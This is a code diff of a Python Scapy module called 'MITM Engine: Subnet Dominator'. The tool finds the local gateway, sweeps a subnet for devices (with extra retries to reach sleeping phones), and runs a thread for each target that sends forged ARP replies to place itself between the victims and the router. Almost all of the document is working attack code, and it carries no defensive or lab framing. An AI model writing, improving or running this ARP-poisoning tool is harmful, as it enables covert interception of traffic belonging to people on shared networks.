@@ -1,7 +1,8 @@
 import os
 import time
 import threading
-from scapy.all import ARP, sendp, Ether, srp, IP, conf, get_if_list
+import socket
+from scapy.all import ARP, sendp, Ether, srp, conf, get_if_list, get_if_addr
 from rich.console import Console
 from rich.table import Table
 from core.ui import draw_header
@@ -16,21 +17,29 @@ class MITMEngine:
         self.gateway_ip = ""
         self.targets = []
 
-    def get_interfaces(self):
-        """Fetches a list of valid network interfaces from Scapy."""
-        return get_if_list()
+    def auto_detect(self):
+        """Attempts to find the active interface and gateway IP automatically."""
+        try:
+            # Get default interface (often en0 on Mac)
+            self.interface = conf.iface
+            # Get default gateway (requires 'netstat' or Scapy route)
+            from scapy.all import conf
+            self.gateway_ip = conf.route.route("0.0.0.0")[2]
+            return True
+        except:
+            return False
 
     def get_mac(self, ip):
-        """Resolves MAC address for a given IP on the selected interface."""
+        """Resolves MAC address with high-retry for sleeping devices."""
         try:
+            # We send multiple packets to 'wake up' mobile devices
             ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),
-                         timeout=2, verbose=False, iface=self.interface)
+                         timeout=3, retry=3, verbose=False, iface=self.interface)
             return ans[0][1].hwsrc if ans else None
-        except Exception:
+        except:
             return None
 
     def poison(self, target_ip, target_mac, gateway_mac):
-        """Sends spoofed ARP packets to intercept traffic."""
         target_pkt = Ether(dst=target_mac)/ARP(op=2, pdst=target_ip,
                                                hwdst=target_mac, psrc=self.gateway_ip)
         router_pkt = Ether(dst=gateway_mac)/ARP(op=2,
@@ -44,68 +53,46 @@ class MITMEngine:
     def run(self):
         draw_header("MITM Engine: Subnet Dominator")
 
-        # --- FIX: Interface Discovery ---
-        ifaces = self.get_interfaces()
-        table = Table(title="Available Network Interfaces",
-                      border_style="cyan")
-        table.add_column("Interface Name", style="bold green")
-        for i in ifaces:
-            table.add_row(i)
-        console.print(table)
-
-        self.interface = console.input(
-            "[bold yellow]Enter exact Interface from list (e.g., wlan0): [/bold yellow]").strip()
-
-        if self.interface not in ifaces:
+        if self.auto_detect():
             console.print(
-                f"[bold red][!] Error:[/bold red] '{self.interface}' is not a valid interface.")
-            input("\nPress Enter to return...")
-            return
+                f"[bold green][+] Auto-Detected:[/bold green] Interface: [cyan]{self.interface}[/cyan], Gateway: [cyan]{self.gateway_ip}[/cyan]")
+            use_auto = console.input(
+                "[bold yellow]Use auto-detected settings? (Y/n): [/bold yellow]").lower() != 'n'
+            if not use_auto:
+                self.interface = console.input("Interface (e.g. en0): ")
+                self.gateway_ip = console.input("Gateway IP: ")
 
-        self.gateway_ip = console.input(
-            "[bold yellow]Gateway (Router) IP: [/bold yellow]")
         target_input = console.input(
-            "[bold yellow]Target IP or Range (e.g. 192.168.1.5 or 192.168.1.0/24): [/bold yellow]")
+            "[bold yellow]Target IP or Range (e.g. 192.168.1.5): [/bold yellow]")
 
-        # Resolve Gateway
-        console.print("[*] Resolving Gateway MAC...")
         gw_mac = self.get_mac(self.gateway_ip)
         if not gw_mac:
             console.print(
-                "[red][!] Could not resolve Gateway MAC. Check your connection.[/red]")
-            input("\nPress Enter...")
+                "[bold red][!] Could not resolve Gateway MAC. Use 'netstat -nr' to verify Gateway IP.[/bold red]")
             return
 
-        # Resolve Targets
-        console.print("[*] Mapping targets on the subnet...")
         ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target_input),
                      timeout=2, verbose=False, iface=self.interface)
-
         self.targets = [(rcv.psrc, rcv.hwsrc)
                         for _, rcv in ans if rcv.psrc != self.gateway_ip]
 
         if not self.targets:
             console.print(
-                "[red][!] No active targets found in the specified range.[/red]")
-            input("\nPress Enter...")
+                "[bold red][!] No active targets found. Cellphones may be asleep.[/bold red]")
             return
 
-        console.print(
-            f"[bold green][+] Poisoning {len(self.targets)} targets...[/bold green]")
         for ip, mac in self.targets:
             threading.Thread(target=self.poison, args=(
                 ip, mac, gw_mac), daemon=True).start()
 
         try:
             console.print(
-                "[bold red][!] Interception Active. Press Ctrl+C to stop.[/bold red]")
+                "[bold red][!] Interception Active. Ctrl+C to stop.[/bold red]")
             while True:
                 time.sleep(1)
         except KeyboardInterrupt:
             self.stop_event.set()
-            console.print(
-                "\n[yellow][*] Stopping attack and cleaning up...[/yellow]")
-            time.sleep(2)
+            console.print("\n[yellow][*] Cleaning up...[/yellow]")
 
 
 def start_mitm():
